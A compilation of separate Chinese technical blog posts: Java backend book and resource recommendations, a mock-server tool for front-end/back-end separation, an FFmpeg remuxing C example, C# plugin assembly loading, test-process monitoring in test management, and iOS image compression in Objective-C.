这两部书籍非常适合学习算法的入门，前者主要用图解的形式覆盖了大部分常用算法，包括dp，贪心等等，可以作为入门书，后者则把很多常用算法都进行了实现，包括搜索，图，树等一些比较高级的常用算法。《剑指offer》这本书还是要强烈推荐的，毕竟是面试题经常参考的书籍，当然最好有前面基本的铺垫再看，可能收获更大，这本书在面试之前一般都要嚼烂。如果想看Java版本的代码，可以到我的Github仓库中查看。《Java编程思想》这本书也是被誉为Java神书的存在了，但是对新手不友好，适合有些基础再看，当然要选择性地看。我当时大概只看了1/3《Java核心技术卷一》这本书还是比较适合入门的，当然，这种厚皮书要看完还是很有难度的，不过比起上面那本要简单一些《深入理解JVM虚拟机》这本书是Java开发者必须看的书，很多jvm的文章都是提取这本书的内容。JVM是Java虚拟机，赋予了Java程序生命，所以好好看看把，我自己就已经看了三遍了。《Java并发编程艺术》这本书是国内作者写的Java并发书籍，比上面那一本更简单易懂，适合作为并发编程的入门书籍，当然，学习并发原理之前，还是先把Java的多线程搞懂吧。《深入JavaWeb技术内幕》这本书是Java Web的集大成之作，涵盖了大部分Java Web开发的知识点，不过一本书显然无法把所有细节都讲完，但是作为Java Web的入门或者进阶书籍来看的话还是很不错的。《Redis设计与实现》该书全面而完整地讲解了 Redis 的内部运行机制,对 Redis 的大多数单机功能以及所有多机功能的实现原理进行了介绍。这本书把Redis的基本原理讲的一清二楚，包括数据结构，持久化，集群等内容，有空应该看看。《大型网站技术架构》这本淘宝系技术指南还是非常值得推崇的，可以说是把大型网站的现代架构进行了一次简单的总结，内容涵盖了各方面，主要讲的是概念，很适合没接触过架构的同学入门。看完以后你会觉得后端技术原来这么博大精深。《分布式服务框架原理与实践》上面那本书讲的是分布式架构的实践，而这本书更专注于分布式服务的原理讲解和对应实践，很好地讲述了分布式服务的基本概念，相关技术，以及解决方案等，对于想要学习分布式服务框架的同学来说是本好书。《从Paxos到Zookeeper分布式一致性原理与实践》说起分布式系统，我们需要了解它的原理，相关理论及技术，这本书也是从这个角度出发，讲解了分布式系统的一些常用概念，并且带出了分布式一哥zookeeper，可以说是想学分布式技术的同学必看的书籍。《大数据技术原理与应用》作为大数据方面的一本教材，厦大教授写的这本书还是非常赞的，从最基础的原理方面讲解了Hadoop的生态系统，并且把每个组件的原理都讲得比较清楚，另外也加入了spark，storm等内容，可以说是大数据入门非常好的一本书了。技术大牛推荐1 江南白衣这位大大绝对是我的Java启蒙导师，他推荐的Java后端书架让我受益匪浅。2 码农翻身刘欣，一位工作15年的IBM架构师，用最浅显易懂的文章讲解技术的那些事，力荐，他的文章帮我解决了很多困惑。3 CoolShell陈皓老师的博客相信大家都看过，干货很多，酷壳应该算是国内最有影响力的个人博客了。4 廖雪峰学习Git和Python，看它的博客就够了。5 HollisChuang阿里一位研发大佬的博客，主要分享Java技术文章，内容还不错。6 梁桂钊阿里另一位研发大佬，博客里的后端技术文章非常丰富。7 chenssy这位大佬分享的Java技术文章也很多，并且有很多基础方面的文章，新手可以多看看。8 Java Doop一位魔都Java开发者的技术博客，里面有一些不错的讲解源码的文章，数量不是很多，但是质量都挺不错的。学习资源分享学习Java后端两年的时间里，接触过很多的资料，网站和课程，也走了不少弯路，所以这里也总结一些比较好的资源推荐给大家。0 CSDN和博客园，主流的技术交流平台，虽然广告越打越多了，但是还是有很多不错的博文的。1 importnew 专注Java学习资源分享，适合Java初学者。2 并发编程网，主要分享Java相关进阶内容，适合Java提高。3 推酷 一个不错的技术分享社区。4 segmentfault，有点像国内的Stack Overflow，适合交流代码问题的地方。5 掘金，一个很有极客范的技术社区，强推，有很多技术大牛分享优质文章。6 开发者头条，一个整合优质技术博客的社区，里面基本上都是精选的高质量博文，适合技术学习提升。7 v2ex，一个极客社区，除了交流技术以外还会有很多和程序员生活相关的话题分享。8 知乎这个就不必多说了。9 简书简书上有些技术文章也很不错，有空大家也可以去看看。10 Github有一些GitHub的项目还是非常不错的，其中也有仓库会分享技术文章。后记秋招结束以后，我就把主要精力花在做这个公众号上了。当然，剩下要处理的事情还有很多，毕业论文，毕业旅行，还有工作前的知识储备等等。果然，人的一生需要不断的修行，刚刚闯过了一关又马上要迎接下一轮挑战，你不能停下脚步，毕竟大家都在往前走。希望还在求职路上的各位少侠好好加油，在未来也能够顺利地拿到自己想要的offer！本文中涉及到的几个链接我汇总在这里，方便大家查看。1、CSDN技术博客：blog.csdn.net/a724888（Java后端技术站点，整理很多Java后端技术文章，推荐Java方向的同学看看）2、知乎：www.zhihu.com/people/h2pl（知乎活跃用户，希望未来能成为大V）3、牛客网：www.nowcoder.com/profile/3539721（牛客网活跃粉，分享过一些面经和心得）4、GitHub：https://github.com/h2pl（用于自己做项目，以及刷剑指offer、LeetCode、历年笔试题）当然，记得要关注一下本公众号，有很多校招和学习干货在这里等你发掘，特别是正在准备校园招聘的各位同学，一定不要错过了哈。作者在今年秋招中成功拿到BAT头条网易等大厂的研发offer，期间总结了很多经验和心得，并把它们写成文字，发表在公众号上，希望让更多有需要的朋友看到，给各位未来的技术大牛们一些小小的帮助。转发和点赞是对作者的最大支持。添加描述​
********************************************************************************************************************************************************************************************************
前后端分离之【接口文档管理及数据模拟工具docdoc与dochelper】
前后端分离的常见开发方式是：

后端：接收http请求->根据请求url及params处理对应业务逻辑->将处理结果序列化为json返回
前端：发起http请求并传递相关参数->获取返回结果处理相关逻辑

分离的主要目的是让前后端可以并行的进行工作，彼此之间只需要依赖一份接口文档
接口文档可能会使用一些文本工具进行记录，例如word，excel等
其中记录的内容可能为请求路径，请求类型，请求参数，响应参数，请求示例，响应示例，变更记录等
不过以上方式还存在那么一点不完美，那就是前端需要等待后端开发完接口才能有数据进行测试在此之前只能先画页面
这就有可能造成前端要等后端的情况，使工作变为串行
因此我想能否有办法可以消除这种情况，让前端不必等待后端
经过一段时间的摸索，我想可以做一个mock server来模拟前端需要的数据
当前端请求某个url时，mock server会在其数据库中进行查询，匹配到这个url后就返回默认或者用户自定义的模拟数据
这样一来前端就可以在不依赖后端的情况下拿到数据进行测试了
但如果只是仅仅依赖mock server，那么一些已开发的接口将无法得到正常的请求
那么问题就又变成了如何使正常接口与mock接口共存
很容易想到的就是使用nginx反向代理，将未开发完的接口匹配到mock server，剩余的接口匹配正常程序
所以前端开发时自己启动一个nginx，然后需要mock什么接口自己去配置即可
但是。。。。当接口很多时，前端得自己手动去配置nginx，还要再对nginx进行重启等等操作，很繁琐
为了解决这个问题我又想能不能让这一切自动化的去完成
有一个客户端程序，自动的对nginx进行相关配置并启动nginx，将开发中的接口转发给mock server，将其余接口转发给正常程序
显然这个思路是可行的，为了让程序好用，客户端制作成了GUI，并且打包成了exe，使以上nginx配置步骤变为一键操作
以下是根据以上思路制作完毕的docdoc及dochelper截图，及一个简单的演示视频：
视频地址：https://www.bilibili.com/video/av46052020
github docdoc：https://github.com/github20120522/docdoc
github dochelper：https://github.com/github20120522/docdochelper
 

 














 
********************************************************************************************************************************************************************************************************
FFmpeg封装格式处理4-转封装例程
本文为作者原创，转载请注明出处：https://www.cnblogs.com/leisure_chn/p/10506662.html
FFmpeg封装格式处理相关内容分为如下几篇文章：
[1]. FFmpeg封装格式处理-简介
[2]. FFmpeg封装格式处理-解复用例程
[3]. FFmpeg封装格式处理-复用例程
[4]. FFmpeg封装格式处理-转封装例程
5. 转封装例程
转封装是将一种封装格式转换为另一种封装格式，不涉及编解码操作，转换速度非常快。

5.1 源码
源码修改自 FFmpeg 4.1 自带的例程 remuxing.c。代码非常简短：
#include <libavutil/timestamp.h>
#include <libavformat/avformat.h>

int main(int argc, char **argv)
{
    AVOutputFormat *ofmt = NULL;
    AVFormatContext *ifmt_ctx = NULL, *ofmt_ctx = NULL;
    AVPacket pkt;
    const char *in_filename, *out_filename;
    int ret, i;
    int stream_index = 0;
    int *stream_mapping = NULL;
    int stream_mapping_size = 0;

    if (argc < 3) {
        printf("usage: %s input output\n"
               "API example program to remux a media file with libavformat and libavcodec.\n"
               "The output format is guessed according to the file extension.\n"
               "\n", argv[0]);
        return 1;
    }

    in_filename  = argv[1];
    out_filename = argv[2];

    // 1. 打开输入
    // 1.1 读取文件头，获取封装格式相关信息
    if ((ret = avformat_open_input(&ifmt_ctx, in_filename, 0, 0)) < 0) {
        printf("Could not open input file '%s'", in_filename);
        goto end;
    }
    
    // 1.2 解码一段数据，获取流相关信息
    if ((ret = avformat_find_stream_info(ifmt_ctx, 0)) < 0) {
        printf("Failed to retrieve input stream information");
        goto end;
    }

    av_dump_format(ifmt_ctx, 0, in_filename, 0);

    // 2. 打开输出
    // 2.1 分配输出ctx
    avformat_alloc_output_context2(&ofmt_ctx, NULL, NULL, out_filename);
    if (!ofmt_ctx) {
        printf("Could not create output context\n");
        ret = AVERROR_UNKNOWN;
        goto end;
    }

    stream_mapping_size = ifmt_ctx->nb_streams;
    stream_mapping = av_mallocz_array(stream_mapping_size, sizeof(*stream_mapping));
    if (!stream_mapping) {
        ret = AVERROR(ENOMEM);
        goto end;
    }

    ofmt = ofmt_ctx->oformat;

    for (i = 0; i < ifmt_ctx->nb_streams; i++) {
        AVStream *out_stream;
        AVStream *in_stream = ifmt_ctx->streams[i];
        AVCodecParameters *in_codecpar = in_stream->codecpar;

        if (in_codecpar->codec_type != AVMEDIA_TYPE_AUDIO &&
            in_codecpar->codec_type != AVMEDIA_TYPE_VIDEO &&
            in_codecpar->codec_type != AVMEDIA_TYPE_SUBTITLE) {
            stream_mapping[i] = -1;
            continue;
        }

        stream_mapping[i] = stream_index++;

        // 2.2 将一个新流(out_stream)添加到输出文件(ofmt_ctx)
        out_stream = avformat_new_stream(ofmt_ctx, NULL);
        if (!out_stream) {
            printf("Failed allocating output stream\n");
            ret = AVERROR_UNKNOWN;
            goto end;
        }

        // 2.3 将当前输入流中的参数拷贝到输出流中
        ret = avcodec_parameters_copy(out_stream->codecpar, in_codecpar);
        if (ret < 0) {
            printf("Failed to copy codec parameters\n");
            goto end;
        }
        out_stream->codecpar->codec_tag = 0;
    }
    av_dump_format(ofmt_ctx, 0, out_filename, 1);

    if (!(ofmt->flags & AVFMT_NOFILE)) {    // TODO: 研究AVFMT_NOFILE标志
        // 2.4 创建并初始化一个AVIOContext，用以访问URL(out_filename)指定的资源
        ret = avio_open(&ofmt_ctx->pb, out_filename, AVIO_FLAG_WRITE);
        if (ret < 0) {
            printf("Could not open output file '%s'", out_filename);
            goto end;
        }
    }

    // 3. 数据处理
    // 3.1 写输出文件头
    ret = avformat_write_header(ofmt_ctx, NULL);
    if (ret < 0) {
        printf("Error occurred when opening output file\n");
        goto end;
    }

    while (1) {
        AVStream *in_stream, *out_stream;

        // 3.2 从输出流读取一个packet
        ret = av_read_frame(ifmt_ctx, &pkt);
        if (ret < 0)
            break;

        in_stream  = ifmt_ctx->streams[pkt.stream_index];
        if (pkt.stream_index >= stream_mapping_size ||
            stream_mapping[pkt.stream_index] < 0) {
            av_packet_unref(&pkt);
            continue;
        }

        pkt.stream_index = stream_mapping[pkt.stream_index];
        out_stream = ofmt_ctx->streams[pkt.stream_index];

        /* copy packet */
        // 3.3 更新packet中的pts和dts
        // 关于AVStream.time_base的说明：
        // 输入：输入流中含有time_base，在avformat_find_stream_info()中可取到每个流中的time_base
        // 输出：avformat_write_header()会根据输出的封装格式确定每个流的time_base并写入文件中
        // AVPacket.pts和AVPacket.dts的单位是AVStream.time_base，不同的封装格式其AVStream.time_base不同
        // 所以输出文件中，每个packet需要根据输出封装格式重新计算pts和dts
        av_packet_rescale_ts(&pkt, in_stream->time_base, out_stream->time_base);
        pkt.pos = -1;

        // 3.4 将packet写入输出
        ret = av_interleaved_write_frame(ofmt_ctx, &pkt);
        if (ret < 0) {
            printf("Error muxing packet\n");
            break;
        }
        av_packet_unref(&pkt);
    }

    // 3.5 写输出文件尾
    av_write_trailer(ofmt_ctx);
end:

    avformat_close_input(&ifmt_ctx);

    /* close output */
    if (ofmt_ctx && !(ofmt->flags & AVFMT_NOFILE))
        avio_closep(&ofmt_ctx->pb);
    avformat_free_context(ofmt_ctx);

    av_freep(&stream_mapping);

    if (ret < 0 && ret != AVERROR_EOF) {
        printf("Error occurred: %s\n", av_err2str(ret));
        return 1;
    }

    return 0;
}
5.2 编译
源文件为remuxing.c，在SHELL中执行如下编译命令：
gcc -o remuxing remuxing.c -lavformat -lavcodec -lavutil -g
生成可执行文件remuxing
5.3 验证
测试文件下载：tnliny.flv

先看一下测试用资源文件的格式：
think@opensuse> ffprobe tnliny.flv 
ffprobe version 4.1 Copyright (c) 2007-2018 the FFmpeg developers
Input #0, flv, from 'tnliny.flv':
  Metadata:
    encoder         : Lavf58.20.100
  Duration: 00:02:26.54, start: 0.000000, bitrate: 446 kb/s
    Stream #0:0: Video: h264 (High), yuv420p(progressive), 800x450, 25 fps, 25 tbr, 1k tbn, 50 tbc
    Stream #0:1: Audio: aac (LC), 44100 Hz, stereo, fltp
运行如下命令进行测试：
./remuxing tnliny.flv tnliny.ts
使用ffprobe检测输出文件正常。使用ffplay播放输出文件正常，播放效果和原始的测试文件一致。

********************************************************************************************************************************************************************************************************
C# 组件模组引用第三方组件问题
对接上一文章由于是动态加载指定程序集，会把当前目录下所有dll都加载进来。如果像sqlite这种第三组件调用了由C、C++非.net语言所以生成的Dll。因为自动生成的原因。会把非C#生成的dll都加载入来导致加载失败。程序异常。那结果当然不是我们想要的结果了。
 
 怎么避免这类事情的发现。那竟然不能加载所有dll了。那就再细化处理。如果有人把组件模组生成了exe那我们正常来说也应该要处理的。毕竟这也是.net所生成出来的项目。也可以动态加载才是正路。
按上一文章生成输出的设置。把每个组件模组生成到指定的目录中去。发下图（可参考上一文章IDE项目的设置）
 
优化加载管理类，把组件模组目录的一级目录当组件名称。一个组件占一个目录以组件模组命名目录。在加载组件时扫描第一层目录。通过第一层目录知道这个组件模组的主程序集。通过命名约束来找到主程序集引用加载。避免加载到非.net生成的dll。然后通过GetReferencedAssemblies方法找出组件模组引用的程序集，把相关的程序集一一加载。
 
加载组件模组引用第三方.net如图是第三方写的json组件。动态加载后再把这个第三方程序集也成功引用入到平台项目中。
 
然后运行的效果发现出错了说是调用不成功要引用的第三方组件，因为找不到那个文件。
 
竟然是找不到文件那要不把那个文件加入到目录试下。果然是能够运行起来了。
 
但这不科学不合理啊。我主程序都没有引用我怎么能够把第三方程序集放到根目录呢。那要是这样子我们还怎么扩展做组件模组。把所在第三方都放在根目录以要是项目引用很多第三方那很不好管理。要是管理不当，引用包的版本冲突这是有一定机率发现的。那竟然是找不到调用文件能不能在解释出错时返回一个正常的程序集包就行了吧。这理论上也是没毛病的。在AppDomaing下找到对应的事件。
 
那就对这事件进行下调用方法。
 
这段代码只要在执行组件模组前调用就行了。为了方便就只直写在Main方法的第一行中方便大家见到。运行效果就不贴图了。
但如引用sqlite这样的第三方组件，由于这第三方组件还调用了c写的SQLite.Interop.dll文件，还区分运行平台是32位系是64位程序。运行输出效果还是找不到指定文件。还是能够够通过把x64\x86这两个文件目录复制到根目录去这就解决问题了。
 

 
 但这也还是在把东西复制到根目录啊，有没有办法解决这个问题呢。调用非.net的dll主要是思路基本上是找到第三方的dll的绝对路径，通过路径调用
System.Runtime.InteropServices.DllImportAttribute(string dllName)
System.Runtime.InteropServices.UnmanagedFunctionPointerAttribute()
这类方法去调用非.net的dll文件的指定方法。这主要还是看写组件开发者的写法，像system.data.sqlite的开发者还提供dll配置方式。可以在初始化时加入配置。然后执行的效果和上面一样。
 
但如果没有配置的是不是一定要把dll放在根目录上呢。这个问题是关于程序域（AppDomain）的问题还是下一回慢慢解说吧。
版本2的代码附件https://files.cnblogs.com/files/DasonKwok/MyPlatformV2.zip
********************************************************************************************************************************************************************************************************
测试管理-测试过程监控
测试活动的监控，对于整体测试工程而言是非常重要的管理内容。
测试工作本身是非常依赖项目其他环节的，测试活动的进行充满了变数。所以对测试的实行情况进行持续的监控和做出及时应对，是管好一个测试项目的必要工作。
 
测试的监控是一个贯穿于整个测试周期内的工作。
在一些情况下，监控的行为并不需要非常系统化的规划和定义，即使如此他很可能也在实时发生着。比如询问某个测试人员的工作进展情况，就可以视作基础的监控动作。对于复杂度相对较低，流程梳理清晰的项目而言，监控工作可能并不复杂，也无需精密的体系和机制进行保证。但是对于复杂平台等一些项目，建立良好的监督控制框架可能是有必要的。
1.监控的目标
在理想情况下，参照V模型理论，我们项目研发应该从项目立项到需求分析到设计到编码，测试从需求评审到测试计划到测试设计到测试执行和报告，有条不紊的开展下去。每个阶段都产出高质量的产出，为下一个或下几个阶段提供支撑。
然而，在实际工作场景中，我们有可能遇到复杂的甚至是计划和预料之外的情况。
比如：

需求到位不及时，或者需求文档质量低下，测试依据不足；
单元测试覆盖率不达标甚至整体缺失，底层测试不充分；
代码提测时间延期，压缩测试时间；
交付产品缺陷情况超出预期，测试任务加重；
项目计划无预期变更，测试原本规划被打乱；
等等......

笔者将监控的目标总结如下：
l 进度掌控
-把握项目进度情况，根据实际与排期之间的差别及时做出调整。
l 管理风险
-及时对项目中的风险进行识别和评估，并作出控制和缓解。
l 解决问题
-做为管理方主动发现和解决团队成员工作中遭遇到的实际困难和问题。
l 加强协同
-通过监控达到加强团队协同能力的目的。
 
总的来说，管理人员必须及时跟进测试实施情况，一旦发生进度滞后，质量低下等影响产品按期高质量交付的情况，必须采取合适的控制行动，扭转这些偏离和异常。良好规划的测试计划是测试管理人实行监督控制的基准和依据，所以也要求我们的计划本身需要高质量制定。良好的计划会使得监督工作更容易展开，有更明确的测试目标和安排，也就更容易让我们发现实际开展过程中的异常。
实际操作过程中，对异常情况或者目标偏离的控制手段，可以是计划的变更以适应实际情况，也可以是资源（人员，时间）的调整。在这个过程中，很有可能需要项目其他方面的协调协助，测试管理人应该始终与项目其他干系人保持良好的合作关系。
为了保证测试任务能够顺利完成，建立有效的监控机制是有必要的。
 
2. 建立监控机制
2.1. 监控整体流程
我们可以用一系列的活动来组织监控流程，一个良好的监控流程应该有以下阶段：

信息采集
问题分析
实施控制

具体到过程上：

了解情况
发现问题
核实问题
评估影响
给出方案
解决问题

如下图所示：
  
2.2. 触发机制
监控触发机制定义测试管理人员在什么触发条件下，启动监控手段。
CMMi定义了以下三种启动形式：
l 定期监控
- 安排固定的监控周期，比如每天、每周等。
项目的管理安排一般都会确定这样的定期活动，比如周例会是很多项目会采取的形式，会议中与会各方会提供关于项目进展的信息以供跟踪控制。
在敏捷型项目中，一个Scrum会议就是典型的定期监控活动，每天项目成员会集体讨论各自的工作进展情况；而在每一个冲刺期的最后阶段，还会安排当前冲刺期的定期回顾会议活动。
l 阶段性监控
-以项目生命周期各阶段的里程碑为标记，通过里程碑的评审会议来对项目的各种参数进行跟踪和监控。
前文我们在测试计划中提到了里程碑的概念，一个里程碑的到达标识着阶段性成果的达成。之所以要设置里程碑，最主要的意义就在于给我们预先设立一个检查点，让我们检查项目进度情况。
l 事件触发性监控
-当突发性事件发生时，需要启动及时的控制手段以应对事件的影响。比如需求的计划变更；比如人员的变动等。
 
除了以上这些触发场景之外，测试管理人也需要实时关注测试工作进展，保证测试任务尽可能无偏差完成。
2.3. 度量机制
测试管理人应该建立相应的度量指标，这样才更有利于对相应情况进行比对分析。否则如果缺乏明确的度量办法，监督得出的结论可能偏向主观评判。
测试的监控对象主要可以有以下方面：

l 质量风险 ·
l 缺陷 ·
l 测试进度 ·
l 覆盖率 ·
l 信心

在项目和业务中，产品风险、缺陷、测试和覆盖率可以，且通常以特定的方式进行度量和汇报。如果这些度量数据和测试计划中定义的出口准则相关，他们可以作为判断测试工作是否完成的客观标准。信心的度量可以通过调查或使用覆盖率作为替代度量，不过通常也会以主观的方式汇报信心。
如果以上内容在项目中适合做为监控对象，那么测试管理人应该尽量明确量化的标准，并且建立这些相关数据的采集办法。
比如对于风险的监控，可以采用的度量：

l 完全覆盖的风险百分比
l 部分覆盖的风险的百分比
l 还未完全测试的风险的百分比
l 按风险类别划分的覆盖的风险百分比 ·
l 在初次质量风险分析后识别的风险的百分比

 
对于测试过程的监控，可以采用的度量：

l 已定义的测试工作项（比如用例设计）的完成度与完成时间
l 已计划的、已详细说明（已实施）的、已运行、通过的、失败的、无法执行的和跳过不执行的 测试总数 ·
l 回归测试和确认测试的状态，包括趋势和未通过的回归测试总数及未通过的确认测试总数 ·
l 计划的每日测试时长对比实际的每日测试时长 ·
l 测试环境的可用性（准备测试团队可用的测试环境占计划测试时长的百分比）

 
对于缺陷情况可以采用的度量：

l 缺陷到达率：缺陷在一定时间段内爆出的数量；
l 缺陷移除率：缺陷在发生阶段被移除的情况；
l 缺陷分布：缺陷在不同模块或子系统中出现的占比；
l 缺陷修复率：单位时间内，报出的，被修复的以及遗留的缺陷数量的对比；

除了这些以外还有缺陷有效率，缺陷类型统计等等可以帮助我们去度量缺陷收敛情况的数据。
 
对于覆盖率监控，可以采用的度量：

l 需求和设计要素的覆盖率 ·
l 风险覆盖率 ·
l 环境／配置覆盖率 ·
l 代码覆盖率

 
 2.4. 信息采集机制
上节提到的数据度量，都需要基于足够并且准确的数据才能完成，所以有必要建立高效的数据采集机制。可以考虑采用以下办法：

l 问讯 ·

　　-　　即测试管理人主动向测试干系人和测试人员询问进度情况

l 阶段性汇报

　　-　　比如日报和周报的手段，收集测试人员关于工作内容及时间花费、测试执行情况、缺陷收敛情况、需要解决之问题以及未来大致安排等信息。
　　-　　这些信息需要被整合，得出整体进度、缺陷、工作安排、严重问题的汇总。

l 跟踪矩阵

　　-　　采用跟踪矩阵的形式，收集测试活动进程信息。
　　-　　常见的矩阵可以从个人工作信息和汇总信息两个层面组织。
比如个人层面：

汇总层面：

采用图表跟踪的办法可以让收集的信息呈现出更高的可视性和可读性，例如： 
 
 
3. 补充
　　最后，测试监控的目的，不仅仅是确保测试进度、完成情况与计划和预期的吻合。对于测试管理人而言，我们测试管理的终极目的在于对质量的保证，而不单单是完成测试的任务。像之前章节中提到的，测试做为整体研发的反馈回路，测试监控中收集到的信息和分析，也是对于项目整体情况的反馈信息源。
　　测试工作本身并不能直接产出质量，就像用体重器称重并不能减肥一样。测试需要依靠它的反馈功能，来促使问题的解决和质量的提高。
　　测试的反馈作用体现在汇报问题和促进问题解决，还表现在用测试的信息收集功能，对于整个研发过程乃至项目管理的情况进行反馈，帮助解决研发过程和管理效能方面的问题。测试监督过程中收集到的数据和信息，都可以用于研发过程能力的反馈。比如项目计划阶段，我们通过风险评估可能会得出某一模块出现缺陷的分概念较低的结论。但是实际测试过程中，可能反映出的实际情况是该模块缺陷频繁爆出。这样的信息可以很大程度推出开发过程出现了未预知的问题。
　　测试管理人应该及时将类似问题系统化，并反馈给开发负责人，依靠和告知团队其他干系人比如项目经理。不能一味的依靠测试执行工作去解决这样的现状，而是要争取从研发链路的更上游控制问题的解决。
********************************************************************************************************************************************************************************************************
iOS学习——图片压缩到指定大小以内
一、图片压缩简述

　　在我们开发过程中，有可能会遇到拍照、或者从相册中选择图片，要么单选或者多选，然后上传图片到服务器，一般情况下一张图片可能3-4M，如果类似微信朋友圈上传9张图片大约是 35M左右，如果我们上传 35M左右的图片到服务器，可想而知后台的压力有多大，最主要的还是特别耗时，如果是在网速比较慢，那么用户上传图片可能需要4-5分钟，那么用户就会受不了，可能会退出应用。所有在开发过程中，考虑到手机性能、网络性能等因素的影响，更重要的是后台服务器的内存、网络等性能的限制，我们再通过网络发送图片等信息时不能发送超过一定大小的图片，如果超过了指定大小，我们需要进行压缩后发送。

　　首先，我们必须明确图片的压缩其实是两个概念：

“压” 是指文件体积变小，但是像素数不变，长宽尺寸不变，那么质量可能下降。
“缩” 是指文件的尺寸变小，也就是像素数减少，而长宽尺寸变小，文件体积同样会减小。

二、图片压缩的实现
 2.1 “压”处理

　　对于“压”的功能，我们一般是使用系统提供的UIImageJPEGRepresentation或UIImagePNGRepresentation方法实现，如：

// return image as PNG. May return nil if image has no CGImageRef or invalid bitmap format
UIKIT_EXTERN NSData *UIImagePNGRepresentation(UIImage *image); 

 // return image as JPEG. May return nil if image has no CGImageRef or invalid bitmap format. compression is 0(most)..1(least)                              
UIKIT_EXTERN NSData *UIImageJPEGRepresentation(UIImage *image, CGFloat compressionQuality); 

//UIImageJPEGRepresentation需要传两个参数，
//第一个参数是图片对象
//第二个参数是压的系数，其值范围为0~1
NSData *imgData=UIImageJPEGRepresentation(image, 0.5);

//UIImagePNGRepresentation只需要传一个参数，就是图片对象
NSData *imgData = UIImagePNGRepresentation(image);

　　UIImagePNGRepresentation要比UIImageJPEGRepresentation(UIImage* image, 1.0)返回的图片数据量大很多。同样的一张照片, 使用UIImagePNGRepresentation(image)返回的数据量大小为199K,而UIImageJPEGRepresentation(image, 1.0)返回的数据量大小只为140K,比前者少了59K。
　　如果对图片的清晰度要求不是极高,建议使用UIImageJPEGRepresentation，可以大幅度降低图片数据量.其中UIImageJPEGRepresentation(UIImage *image, CGFloat compressionQuality)提供了一个压缩比率的参数compressionQuality，但是实际体验确实compressionQuality并不能够按照设定好的数值，比例压缩。比如一张2.9M的图片(jpg格式),通过UIImageJPEGRepresentation方法设置不同压缩比进行压缩后的大小如下：

2019-03-13 13:54:33.546342+0800 CJMobile[52591:15764262] compression = 1.000000 image length = 7076.682617 kB
2019-03-13 13:54:33.658606+0800 CJMobile[52591:15764262] compression = 0.500000 image length = 1490.095703 kB
2019-03-13 13:54:33.748077+0800 CJMobile[52591:15764262] compression = 0.250000 image length = 671.213867 kB
2019-03-13 13:54:33.834126+0800 CJMobile[52591:15764262] compression = 0.125000 image length = 550.979492 kB
2019-03-13 13:54:33.918830+0800 CJMobile[52591:15764262] compression = 0.062500 image length = 532.168945 kB
2019-03-13 13:54:34.004086+0800 CJMobile[52591:15764262] compression = 0.031250 image length = 532.107422 kB
2019-03-13 13:54:34.089819+0800 CJMobile[52591:15764262] compression = 0.015625 image length = 532.107422 kB

　　通过上面的结果我们可以看到，compressionQuality压缩系数跟最后文件的大小并没有明显的关系，不同的图片呈现不同结果，而且最后压缩比减小但是得到的图片大小没有变化。本人对图片存储格式不是很了解，所以对出现这样的情况不是很了解，如果有对此比较了解的同学烦请赐教。但是图片颜色细节越单一，图片可压缩的比率会越高。
　　UIImagePNGRepresentation虽然可以让我们控制压缩质量比例，但是我们看到这个压缩比compressionQuality实际上很难确定一张图片是否能压缩到误差范围内，无法实现精确压缩。

2.2 “缩”处理
　　UIImagePNGRepresentation虽然可以让我们控制压缩质量比例，但是我们看到这个压缩比compressionQuality实际上很难确定一张图片是否能压缩到误差范围内，无法实现精确压缩。所以我们对图片只“压”而不缩，有时候是达不到我们的需求的。因此，必要的时候，我们需要适当地对图片“缩”一“缩“尺寸，就可以满足我们的需求。

通过 [sourceImage drawInRect:CGRectMake(0, 0, targetWidth, targetHeight)] 可以进行图片“缩”的功能。示例如下：

- (UIImage*)compressImage:(UIImage*)sourceImage toTargetWidth:(CGFloat)targetWidth {
    //获取原图片的大小尺寸
    CGSize imageSize = sourceImage.size;
    CGFloat width = imageSize.width;
    CGFloat height = imageSize.height;
    //根据目标图片的宽度计算目标图片的高度
    CGFloat targetHeight = (targetWidth / width) * height;
    //开启图片上下文
    UIGraphicsBeginImageContext(CGSizeMake(targetWidth, targetHeight));
    //绘制图片
    [sourceImage drawInRect:CGRectMake(0,0, targetWidth, targetHeight)];
    //从上下文中获取绘制好的图片
    UIImage*newImage = UIGraphicsGetImageFromCurrentImageContext();
    //关闭图片上下文
    UIGraphicsEndImageContext();
    
    return newImage;
}

 　　通过“缩”处理，我们可以将图片压缩到任何我们制定的大小尺寸内，但是这种处理，我们改变了原先图片的尺寸大小，无法保证图片的质量。

三、图片压缩到指定大小以内实现
　　当我们需要对图片的大小进行限制时，我们首先应该优先采取“压”处理，如果“压”处理达不到要求，那么我们在“压”处理的结果上继续进行“缩”处理，直到图片的大小达到我们的要求为止。

/*!
 *  @brief 使图片压缩后刚好小于指定大小
 *
 *  @param image 当前要压缩的图 maxLength 压缩后的大小
 *
 *  @return 图片对象
 */
//图片质量压缩到某一范围内，如果后面用到多，可以抽成分类或者工具类,这里压缩递减比二分的运行时间长，二分可以限制下限。
- (UIImage *)compressImageSize:(UIImage *)image toByte:(NSUInteger)maxLength{
    //首先判断原图大小是否在要求内，如果满足要求则不进行压缩，over
    CGFloat compression = 1;
    NSData *data = UIImageJPEGRepresentation(image, compression);
    if (data.length < maxLength) return image;
    //原图大小超过范围，先进行“压处理”，这里 压缩比 采用二分法进行处理，6次二分后的最小压缩比是0.015625，已经够小了
    CGFloat max = 1;
    CGFloat min = 0;
    for (int i = 0; i < 6; ++i) {
        compression = (max + min) / 2;
        data = UIImageJPEGRepresentation(image, compression);
        if (data.length < maxLength * 0.9) {
            min = compression;
        } else if (data.length > maxLength) {
            max = compression;
        } else {
            break;
        }
    }
    //判断“压处理”的结果是否符合要求，符合要求就over
    UIImage *resultImage = [UIImage imageWithData:data];
    if (data.length < maxLength) return resultImage;
    
    //缩处理，直接用大小的比例作为缩处理的比例进行处理，因为有取整处理，所以一般是需要两次处理
    NSUInteger lastDataLength = 0;
    while (data.length > maxLength && data.length != lastDataLength) {
        lastDataLength = data.length;
        //获取处理后的尺寸
        CGFloat ratio = (CGFloat)maxLength / data.length;
        CGSize size = CGSizeMake((NSUInteger)(resultImage.size.width * sqrtf(ratio)),
                                 (NSUInteger)(resultImage.size.height * sqrtf(ratio)));
        //通过图片上下文进行处理图片
        UIGraphicsBeginImageContext(size);
        [resultImage drawInRect:CGRectMake(0, 0, size.width, size.height)];
        resultImage = UIGraphicsGetImageFromCurrentImageContext();
        UIGraphicsEndImageContext();
        //获取处理后图片的大小
        data = UIImageJPEGRepresentation(resultImage, compression);
    }
    
    return resultImage;
}

 
********************************************************************************************************************************************************************************************************
全网Star最多（近20k）的Spring Boot开源教程 2019 年要继续更新了！
